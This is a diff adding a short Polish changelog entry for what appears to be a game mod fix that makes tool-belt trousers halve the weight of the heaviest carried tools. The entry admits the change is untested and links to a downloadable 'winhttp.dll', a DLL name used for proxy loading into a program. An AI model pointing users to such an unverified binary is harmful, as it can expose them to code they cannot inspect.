@@ -1,0 +1,6 @@
+#updates
+**Poprawka: spodnie z pasem na narzędzia**
+• Było: bojówki (i inne spodnie) z pasem nic nie odciążały, bo bez DLC nie było skąd wziąć bonusu pasa.
+• Jest: gdy masz założone spodnie z pasem, 3 najcięższe narzędzia w plecaku ważą połowę, tak jak w opisie przedmiotu. Działa też na spodnie znalezione w szufladach.
+Nie testowane.
+Link: https://github.com/cgpt28641-ops/polar-link/releases/download/dll-latest/winhttp.dll
